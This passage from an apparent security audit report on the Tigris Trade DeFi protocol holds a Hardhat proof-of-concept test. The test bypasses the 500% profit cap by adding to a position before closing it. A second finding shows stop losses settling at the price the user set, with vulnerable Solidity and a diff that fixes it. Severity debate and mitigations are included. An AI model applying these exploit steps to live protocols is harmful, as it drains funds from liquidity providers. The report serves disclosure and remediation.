badstablevault = await BadStableVault.deploy(StableToken.address);

const ChainlinkContract = await ethers.getContractFactory("MockChainlinkFeed");
chainlink = await ChainlinkContract.deploy();

TradingLibrary = await deployments.get("TradingLibrary");
tradinglibrary = await ethers.getContractAt("TradingLibrary", TradingLibrary.address);
await trading.connect(owner).setLimitOrderPriceRange(1e10);

});
describe("Bypass the maximum PnL check to take extra profit", function () {
    let orderId;
    let closePriceData;
    let closeSig;
    let initPrice = parseEther("1000");
    let closePrice = parseEther("2000");
    beforeEach(async function () {
      let maxWin = await trading.maxWinPercent();
      expect(maxWin.eq(5e10)).to.equal(true);
  let TradeInfo = [parseEther("1000"), MockDAI.address, StableVault.address, parseEther("10"), 1, true, parseEther("0"), parseEther("0"), ethers.constants.HashZero];
  let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];
  let message = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
      [node.address, 1, initPrice, 0, 2000000000, false]
    )
  );
  let sig = await node.signMessage(
    Buffer.from(message.substring(2), 'hex')
  );

  let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
  orderId = await position.getCount();
  await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
  expect(await position.assetOpenPositionsLength(1)).to.equal(1);
  let trade = await position.trades(orderId);
  let marginAfterFee = trade.margin;
  expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);

  // Some time later
  await network.provider.send("evm_setNextBlockTimestamp", [2000001000]);
  await network.provider.send("evm_mine");

  // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900
  closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];
  let closeMessage = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
      [node.address, 1, closePrice, 0, 2000001000, false]
    )
  );
  closeSig = await node.signMessage(
    Buffer.from(closeMessage.substring(2), 'hex')
  );

});

it.only("All profit is $9900, close the order normally, only get $3960 profit", async function () {
  let balanceBefore = await stabletoken.balanceOf(owner.address);
  await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
  let balanceAfter = await stabletoken.balanceOf(owner.address);
  let marginAfterFee = parseEther("990");
  let payout = balanceAfter.sub(balanceBefore);
  expect(payout.eq(parseEther("4950"))).to.be.true;

  let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);
  expect(profit.eq(parseEther("3960"))).to.be.true;

});

it.only("All profit is $9900, bypass the PnL check to take extra $2600 profit", async function () {
  // We increase the possition first rather than closing the profit order directly
  let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
  let extraMargin = parseEther("1000");
  await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);

  // 60 secs later
  await network.provider.send("evm_setNextBlockTimestamp", [2000001060]);
  await network.provider.send("evm_mine");

  // Now we close the order to take all profit
  closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];
  let closeMessage = ethers.utils.keccak256(
    ethers.utils.defaultAbiCoder.encode(
      ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
      [node.address, 1, closePrice, 0, 2000001060, false]
    )
  );
  closeSig = await node.signMessage(
    Buffer.from(closeMessage.substring(2), 'hex')
  );

  let balanceBefore = await stabletoken.balanceOf(owner.address);
  await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
  let balanceAfter = await stabletoken.balanceOf(owner.address);
  let marginAfterFee = parseEther("990").add(extraMargin.mul(990).div(1000));
  let originalProfit = parseEther("3960");
  let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);
  expect(extraProfit.gt(parseEther('2600'))).to.be.true;
});

});
});
```
The test result
 Design Specification: Maximum PnL is +500%
    Bypass the maximum PnL check to take extra profit
      √ All profit is $9900, close the order normally, only get $3960 profit
      √ All profit is $9900, bypass the PnL check to take extra $2600 profit

Tools Used
VS Code
Recommended Mitigation Steps
Add a check for addToPosition() function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.
TriHaz (Tigris Trade) confirmed, but disagreed with severity and commented:

It is valid but I think it should be Medium risk as it needs +500% win to happen so assets are not in a direct risk, need a judge opinion on this.

KingNFT (warden) commented:

As the max leverages are 100x for crypto pairs and 500x for forex pairs, so 5% price change on crypto pairs or 1% on forex pairs lead to 500% profit. I think it would be frequent to see +500% win happening.
In my personal opinion, the 500% security design is a base and important feature to protect fund safety of stakers, this bug causes the feature almost not working. Maybe it deserves a high severity.

Alex the Entreprenerd (judge) commented:

The Warden has shown how, because of a lack of checks, an attacker could bypass the PNL cap and extract more value than intended.
While the condition of having a price movement of 500% can be viewed as external, I believe that in this specific case we have to exercise more nuance.
An attacker could setup a contract to perform the sidestep only when favourable, meaning that while the condition may not always be met, due to volatility of pricing there always is a % (can be viewed as a poisson distribution) that a PNL bypass would favour the attacker.
Additionally, after the CRV / AVI attack we have pretty strong evidence that any +EV scenario can be exploited as long as the payout is high enough.
As such I believe that the finding doesn't truly rely on an external condition.
For this reason, as well as knowing that the value extracted will be paid by LPs / the Protocol, I believe High Severity to be the most appropriate

GainsGoblin (Tigris Trade) commented:

Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173887 
Implemented something similar to this report's recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.




## [H-10]  "User can abuse tight stop losses and high leverage to make risk free trades"

Submitted by 0x52, also found by hansfriese and noot
User can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.
Proof of Concept
function limitClose(
    uint _id,
    bool _tp,
    PriceData calldata _priceData,
    bytes calldata _signature
)
    external
{
    _checkDelay(_id, false);
    (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);
    _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);
}

function _limitClose(
    uint _id,
    bool _tp,
    PriceData calldata _priceData,
    bytes calldata _signature
) external view returns(uint _limitPrice, address _tigAsset) {
    _checkGas();

    IPosition.Trade memory _trade = position.trades(_id);
    _tigAsset = _trade.tigAsset;
    getVerifiedPrice(_trade.asset, _priceData, _signature, 0);
    uint256 _price = _priceData.price;
    if (_trade.orderType != 0) revert("4"); //IsLimit
    if (_tp) {
        if (_trade.tpPrice == 0) revert("7"); //LimitNotSet
        if (_trade.direction) {
            if (_trade.tpPrice > _price) revert("6"); //LimitNotMet
        } else {
            if (_trade.tpPrice < _price) revert("6"); //LimitNotMet
        }
        _limitPrice = _trade.tpPrice;
    } else {
        if (_trade.slPrice == 0) revert("7"); //LimitNotSet
        if (_trade.direction) {
            if (_trade.slPrice < _price) revert("6"); //LimitNotMet
        } else {
            if (_trade.slPrice > _price) revert("6"); //LimitNotMet
        }
        //@audit stop loss is closed at user specified price NOT market price
        _limitPrice = _trade.slPrice;
    }
}

When closing a position with a stop loss the user is closed at their SL price rather than the current price of the asset. A user could abuse this in directional markets with high leverage to make nearly risk free trades. A user could open a long with a stop loss that in $0.01 below the current price. If the price tanks immediately on the next update then they will be closed out at their entrance price, only out the fees to open and close their position. If the price goes up then they can make a large gain.
Recommended Mitigation Steps
Take profit and stop loss trades should be executed at the current price rather than the price specified by the user:
         if (_trade.tpPrice == 0) revert("7"); //LimitNotSet
        if (_trade.direction) {
            if (_trade.tpPrice > _price) revert("6"); //LimitNotMet
        } else {
            if (_trade.tpPrice < _price) revert("6"); //LimitNotMet
        }
-       _limitPrice = _trade.tpPrice;
+       _limitPrice = _price;
    } else {
        if (_trade.slPrice == 0) revert("7"); //LimitNotSet
        if (_trade.direction) {
            if (_trade.slPrice < _price) revert("6"); //LimitNotMet
        } else {
            if (_trade.slPrice > _price) revert("6"); //LimitNotMet
        }
-       _limitPrice = _trade.slPrice;
+       _limitPrice = _price;

TriHaz (Tigris Trade) disputed and commented:

Because of open fees, close fees and spread, that wouldn't be profitable.
We also have a cooldown after a trade is opened so there will be enough time for price to move freely past the sl.

Alex the Entreprenerd (judge) commented:

The warden has shown a flaw in how the protocol offers Stop Losses.
By using the originally stored value for Stop Loss, instead of just using it as a trigger, an attacker can perform a highly profitable strategy on the system as they know that their max risk is capped by the value of the Stop Loss, instead of the current asset price.
This will happen at the detriment of LPs.
Because the attack breaks an important invariant, causing a loss to other users, I agree with High Severity.




